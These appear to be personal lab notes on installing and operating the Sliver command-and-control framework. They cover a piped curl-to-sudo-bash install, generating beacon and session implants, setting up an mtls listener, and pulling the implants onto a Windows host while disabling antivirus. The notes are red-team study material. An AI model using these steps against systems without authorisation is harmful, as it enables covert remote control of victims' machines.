## Installation
https://sliver.sh/
https://github.com/BishopFox/sliver/releases
- Installation: `curl https://sliver.sh/install|sudo bash` and then run `sliver`
- ![[Pasted image 20260718145324.png]]

Install Sliver Server
- https://github.com/BishopFox/sliver/releases
- `wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64`
- Before proceeding let's unpack things: `./sliver-server unpack --force`

Install Sliver Client
- https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64
- `wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64`

![[Pasted image 20260718145942.png]]

## Server-Client Connection
Let's start by making a configuration file with sliver-server operator with this command
- `./sliver-server operator -l <server_ip> -n <name> -s <path> -P <permissions>` 
![[Pasted image 20260718150528.png]]
Then start server daemon with
- `./sliver-server daemon`
After starting daemon, we will connect client with this configuration file
- Importing config file with `./sliver-client import <config_file_path>`
- then start the client: `./sliver-client`

## Implant
Generating Session based Implant
- `generate -m <ip_of_sliver_client> -s Payloads/`
- The command will generate an implant into Payloads directory
Generating Beacon based Implant
- `generate beacon -m <ip_of_sliver_client> -s Payloads/ -S 45 -J 15`

## Listeners
Types of Listeners: dns, mtls, http/https. wg
We will explore mtls. Start the listener with just `mtls` and list all listeners with `job`
![[Pasted image 20260718172652.png]]
Now that the job is running, import beacon and session into Windows using `iwr`
![[Pasted image 20260718215349.png]]
and then run the binaries (make sure to disable real time anti virus download using `iwr`)
![[Pasted image 20260718215315.png]]
We see the session and beacon on sliver-server. To view session use `sessions` and for beacon use `beacons` on sliver-server shell.
![[Pasted image 20260718215635.png]]
- In order to use session or beacon we've to use `use <id>` to get into console. 
- For beacons use `tasks`to list tasks.
- For getting interactive session from Beacon: use `interactive`
- use `background` to get into server shell from session / beacon




Good Resources
- https://redsiege.com/blog/2022/11/introduction-to-sliver/
- https://www.youtube.com/@hackerforceyt